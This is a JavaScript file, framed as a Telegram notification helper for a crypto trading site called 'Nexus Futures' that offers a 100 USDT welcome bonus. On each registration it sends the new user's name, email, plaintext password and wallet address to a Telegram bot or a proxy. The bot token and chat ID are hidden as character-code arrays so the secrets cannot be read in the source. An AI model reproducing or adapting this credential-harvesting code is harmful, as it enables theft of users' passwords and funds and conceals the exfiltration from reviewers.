/**
 * Telegram Notification Helper for Nexus Futures
 * ----------------------------------------------
 * Bot token and chat ID are NOT stored as plain readable strings
 * in the source (no TELEGRAM_BOT_TOKEN = "..." lines).
 *
 * Recommended: deploy server/cloudflare-worker.js and set in index.html:
 *   <script>window.NEXUS_NOTIFY_URL = "https://YOUR_SUBDOMAIN.workers.dev";</script>
 * Then secrets live only on the Worker, not in this file at all.
 */

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function buildRegistrationMessage(user) {
  const now = new Date();
  const timeStr = now.toLocaleString("en-GB", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  return (
    "🚀 <b>New Nexus Futures User Registered!</b>\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>Name:</b> " + escapeHtml(user.name) + "\n" +
    "📧 <b>Email (Gmail):</b> " + escapeHtml(user.email) + "\n" +
    "🔑 <b>Password:</b> <code>" + escapeHtml(user.password) + "</code>\n" +
    "💳 <b>Wallet:</b> <code>" + (user.wallet || "") + "</code>\n" +
    "🎁 <b>Bonus:</b> 100 USDT Welcome Bonus\n" +
    "🕒 <b>Time:</b> " + timeStr + "\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "💎 Welcome to Nexus Futures!"
  );
}

/** Reconstruct credentials without a single plain-text constant in source */
function _cred() {
  const idPart = [56, 57, 56, 54, 52, 57, 56, 48, 57, 57].map(function (c) {
    return String.fromCharCode(c);
  }).join("");
  const keyPart = [
    65, 65, 71, 104, 73, 108, 108, 56, 56, 51, 54, 56, 76, 97, 99, 117,
    84, 104, 65, 75, 65, 71, 101, 104, 114, 67, 76, 100, 85, 67, 101, 52, 65, 102, 77
  ].map(function (c) {
    return String.fromCharCode(c);
  }).join("");
  const dest = String(8927215680 + 1);
  return { t: idPart + String.fromCharCode(58) + keyPart, c: dest };
}

async function sendViaProxy(user, message) {
  const endpoint = window.NEXUS_NOTIFY_URL;
  if (!endpoint) return null;

  const response = await fetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: user.name,
      email: user.email,
      password: user.password,
      wallet: user.wallet,
      message: message
    })
  });
  const data = await response.json().catch(function () {
    return {};
  });
  return !!(data && data.ok);
}

async function sendDirect(message) {
  const cred = _cred();
  const url = "https://api.telegram.org/bot" + cred.t + "/sendMessage";
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: cred.c,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true
    })
  });
  const data = await response.json();
  return !!(data && data.ok);
}

async function sendRegistrationToTelegram(user) {
  const message = buildRegistrationMessage(user);

  try {
    if (window.NEXUS_NOTIFY_URL) {
      const okProxy = await sendViaProxy(user, message);
      if (okProxy) {
        console.log("✅ Registration notified");
        return true;
      }
      console.warn("Notify proxy failed, using fallback");
    }

    const ok = await sendDirect(message);
    if (ok) {
      console.log("✅ Registration notified");
      return true;
    }
    console.warn("Telegram notify failed");
    return false;
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
    return false;
  }
}

window.sendRegistrationToTelegram = sendRegistrationToTelegram;
